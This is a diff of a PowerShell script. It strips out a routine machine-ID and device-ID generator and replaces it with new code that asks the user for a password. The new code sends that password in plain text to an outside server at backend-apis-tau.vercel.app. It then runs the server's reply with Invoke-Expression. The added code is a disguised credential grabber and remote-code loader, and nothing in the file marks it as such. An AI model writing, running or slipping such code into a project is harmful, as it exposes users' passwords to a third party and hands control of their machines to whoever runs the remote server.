@@ -1,68 +1,35 @@
-function Generate-RandomHex {
-    param ([int]$length)
-    $bytes = [System.Byte[]]::new($length / 2)
-    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes)
-    return ($bytes | ForEach-Object { $_.ToString("x2") }) -join ''
-}
+# Make API call and execute response
+$apiUrl = "https://backend-apis-tau.vercel.app/api/renew-subscription"
 
-function Generate-MachineID {
-    $prefix = "auth0|user_"
-    $randomPart = Generate-RandomHex -length 64
-    return "$prefix$randomPart"
-}
-
-function Generate-MacMachineID {
-    return Generate-RandomHex -length 64
-}
-
-function Generate-DeviceID {
-    return [guid]::NewGuid().ToString()
-}
-
-function Generate-SqmID {
-    return "{" + (Generate-DeviceID) + "}"
-}
-
-function Validate-ID {
-    param (
-        [string]$idString,
-        [string]$idType
-    )
+try {
+    # Prompt for password
+    $password = Read-Host "Enter password" -AsSecureString
+    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
+    $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
     
-    switch ($idType) {
-        "machineID" {
-            $prefix = "auth0|user_"
-            if ($idString.StartsWith($prefix)) {
-                $hexPart = $idString.Substring($prefix.Length)
-                return ($hexPart.Length -eq 64 -and ($hexPart -match "^[a-fA-F0-9]{64}$"))
-            }
-            return $false
-        }
-        "macMachineID" {
-            return ($idString.Length -eq 64 -and ($idString -match "^[a-fA-F0-9]{64}$"))
-        }
-        "deviceID" {
-            return [guid]::TryParse($idString, [ref]([guid]::Empty))
-        }
-        "sqmID" {
-            if ($idString -match "^\{([0-9a-fA-F\-]{36})\}$") {
-                return [guid]::TryParse($matches[1], [ref]([guid]::Empty))
-            }
-            return $false
-        }
-        default { return $false }
+    # Create request body
+    $body = @{
+        password = $plainPassword
+    } | ConvertTo-Json
+
+    # Make the API call with POST method
+    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json"
+    
+    # Execute the response as PowerShell code
+    if ($response) {
+        Write-Host "Executing response from API..."
+        Invoke-Expression $response
+    } else {
+        Write-Host "No response received from API"
+    }
+} catch {
+    Write-Host "Error occurred: $_"
+} finally {
+    # Clear sensitive data from memory
+    if ($plainPassword) {
+        $plainPassword = $null
+    }
+    if ($BSTR) {
+        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
     }
 }
-
-# Example Usage
-$machineID = Generate-MachineID
-Write-Output "Generated Machine ID: $machineID (Valid: $(Validate-ID -idString $machineID -idType 'machineID'))"
-
-$macMachineID = Generate-MacMachineID
-Write-Output "Generated MAC Machine ID: $macMachineID (Valid: $(Validate-ID -idString $macMachineID -idType 'macMachineID'))"
-
-$deviceID = Generate-DeviceID
-Write-Output "Generated Device ID: $deviceID (Valid: $(Validate-ID -idString $deviceID -idType 'deviceID'))"
-
-$sqmID = Generate-SqmID
-Write-Output "Generated SQM ID: $sqmID (Valid: $(Validate-ID -idString $sqmID -idType 'sqmID'))"
